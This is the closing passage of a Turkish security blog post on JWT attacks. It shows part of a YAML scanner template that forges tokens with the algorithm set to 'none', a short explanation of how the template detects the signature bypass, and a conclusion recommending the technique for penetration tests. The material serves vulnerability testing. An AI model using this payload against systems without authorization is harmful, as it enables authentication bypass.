</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">headers</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">Authorization</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;Bearer {{jwt_header_none}}&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">payloads</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">jwt_header_none</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span>- <span class="s2">&#34;{{jwt | replace(&#39;HS256&#39;,&#39;none&#39;)}}.&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">matchers</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">status</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">status</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="m">200</span><span class="w">
</span></span></span></code></pre></div><p><strong>Template Mantığı:</strong>
Bu template, <strong>alg: none (Signature Bypass)</strong> saldırısını otomatize eder:</p>
<ol>
<li>Sitedeki geçerli JWT&rsquo;yi regex ile bulur.</li>
<li>Token algoritmasını <code>none</code> yaparak imzayı devre dışı bırakır.</li>
<li>Sahte token ile istek atar sunucu <code>200 OK</code> verirse zafiyeti raporlar.</li>
</ol>
<h2 id="sonuç">Sonuç</h2>
<p>Bu yazıda JWT yapısını, kritik saldırı tekniklerini inceledik. Basit yapılandırma hatalarının sistemde zafiyete yol açabileceğini gördük. Bu yöntemleri sızma testlerinize dahil ederek güvenlik analizlerinizi daha kapsamlı hale getirebilirsiniz.</p>

            </div>
        </article></main>
</div>
<footer class="footer">
    <span class="footer_item"> </span>
    &nbsp;

    <div class="footer_social-icons">
<a href="/index.xml" target="_blank" rel="noopener noreferrer me"
    title="Rss">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path d="M4 11a9 9 0 0 1 9 9" />
    <path d="M4 4a16 16 0 0 1 16 16" />
    <circle cx="5" cy="19" r="1" />
</svg>
</a>
</div>
    <small class="footer_copyright">
        © 2025 Alperen Keskin.
        
    </small>
</footer><a href="#" title="" id="totop">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
</svg>

</a>


    




    
    
        
    

    
    
        
    



    
    <script src="https://alperenkesk.github.io/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>

    

</body>
</html>
